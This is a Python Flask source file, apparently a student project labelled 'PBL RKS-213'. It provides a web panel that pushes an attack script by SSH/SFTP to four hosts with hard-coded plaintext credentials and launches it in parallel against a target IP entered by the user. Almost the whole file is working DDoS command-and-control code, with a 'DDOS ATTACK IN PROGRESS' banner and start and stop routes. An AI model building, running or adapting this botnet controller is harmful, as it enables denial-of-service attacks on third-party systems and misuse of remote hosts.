import threading
import paramiko
import time
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

title = '''
   ___  ___       ____  ___ _______________  _______ __
  / _ \/ _ \___  / __/ / _ /_  __/_  __/ _ |/ ___/ //_/
 / // / // / _ \_\ \  / __ |/ /   / / / __ / /__/ ,<   
/____/____/\___/___/ /_/ |_/_/   /_/ /_/ |_\___/_/|_|  
                                                       
             DDOS ATTACK IN PROGRESS
         Script DDos Attack PBL RKS-213
'''

hosts = [
    {'ip': '192.168.1.11', 'port': 22, 'username': 'bumi', 'password': 'qwe'},
    {'ip': '192.168.1.12', 'port': 22, 'username': 'bumi', 'password': 'qwe'},
    {'ip': '192.168.1.13', 'port': 22, 'username': 'bumi', 'password': 'qwe'},
    {'ip': '192.168.1.14', 'port': 22, 'username': 'bumi', 'password': 'qwe'},
]

attack_in_progress = False

def run_command_on_host(host, port, username, password, command, send_file=False):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(host, port=port, username=username, password=password)

        if send_file:
            sftp = ssh_client.open_sftp()
            sftp.put('attack_script.py', f'/home/{username}/Desktop/attack_script.py')
            ssh_client.exec_command(f"chmod +x /home/{username}/Desktop/attack_script.py")
            sftp.close()

        full_command = f"cd /home/{username}/Desktop && {command}"

        stdin, stdout, stderr = ssh_client.exec_command(full_command)
        stdin.write(f'{password}\n')
        stdin.flush()

        for line in stdout:
            print(f"Output from {host}: {line.strip()}")

        for line in stderr:
            print(f"Error from {host}: {line.strip()}")

        ssh_client.close()

    except Exception as e:
        print(f"SSH connection error to {host}: {e}")

def start_ddos_attack(attack_type, target_ip):
    global attack_in_progress
    attack_in_progress = True
    threads = []
    for host in hosts:
        command = f"python3 /home/{host['username']}/Desktop/attack_script.py {attack_type} {target_ip}"
        t = threading.Thread(target=run_command_on_host, args=(host['ip'], host['port'], host['username'], host['password'], command, True))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

def stop_ddos_attack():
    global attack_in_progress
    attack_in_progress = False
    threads = []
    for host in hosts:
        command = "killall python3"
        t = threading.Thread(target=run_command_on_host, args=(host['ip'], host['port'], host['username'], host['password'], command))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/about_us')
def about_us():
    return render_template('about_us.html')

@app.route('/description')
def description():
    return render_template('description.html')

@app.route('/project')
def project():
    return render_template('project.html')

@app.route('/ddos_attack', methods=['GET', 'POST'])
def ddos_attack():
    global attack_in_progress
    if request.method == 'POST':
        attack_type = request.form['attack_type']
        target_ip = request.form['target_ip']
        num_botnets = int(request.form['num_botnets'])
        threading.Thread(target=start_ddos_attack, args=(attack_type, target_ip)).start()
        attack_in_progress = True
    return render_template('ddos_attack.html', attack_in_progress=attack_in_progress, hosts=hosts)

@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    global attack_in_progress
    if attack_in_progress:
        threading.Thread(target=stop_ddos_attack).start()
    return render_template('ddos_attack.html', attack_in_progress=attack_in_progress, hosts=hosts)

@app.route('/attack_status', methods=['GET'])
def attack_status():
    global attack_in_progress
    return jsonify({'attack_in_progress': attack_in_progress})

if __name__ == '__main__':
    app.run(debug=True)
